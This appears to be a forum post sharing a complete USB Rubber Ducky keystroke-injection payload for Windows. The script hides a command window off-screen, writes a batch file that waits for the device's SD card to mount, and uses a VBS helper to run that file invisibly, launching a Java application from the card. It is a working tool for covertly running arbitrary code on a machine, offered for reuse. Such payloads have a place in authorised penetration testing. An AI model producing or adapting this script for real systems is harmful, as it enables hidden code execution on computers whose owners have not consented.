The following is another payload for running applications on Twin duck firmware from off your SD card automatically. This payload waits for the ducky drive to mount, then switches to the directory containing the Java payload, then launches the payload. I don't know how useful this will be, but it is here if you need it. This only runs on Windows systems, but should run on all current Windows thanks to some code written by googleknowsbest. Change "JavaApp" to the name of your application. 
```
REM Author: overwraith
REM Name: Java_Application.txt
REM Purpose: Run a java application off the ducky drive after it mounts.  
REM Encoder V2.4
REM Using the run command for a broader OS base. 
DEFAULT_DELAY 25
DELAY 3000
GUI r
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER

REM Change directories because System32 appears to be protected. 
STRING CD %TEMP%
ENTER

REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
STRING erase /Q DuckyWait.bat
ENTER
STRING copy con DuckyWait.bat
ENTER
REM DuckyWait.bat
STRING :while1
ENTER

STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
ENTER
STRING if Exist %DUCKYdrive% (
ENTER
STRING goto :break
ENTER
STRING )
ENTER
STRING timeout /t 30
ENTER
STRING goto :while1
ENTER
STRING :break
ENTER
REM Continue script.
STRING %DUCKYdrive%
ENTER
STRING cd Java_Application
ENTER
STRING Java JavaApp
ENTER
CONTROL z
ENTER

REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL z
ENTER

REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs DuckyWait.bat
ENTER
STRING EXIT
ENTER
```

If you are not containing this script and the application within a folder on the ducky drive, then remove this line: 

```
...
STRING cd Java_Application
ENTER
...
```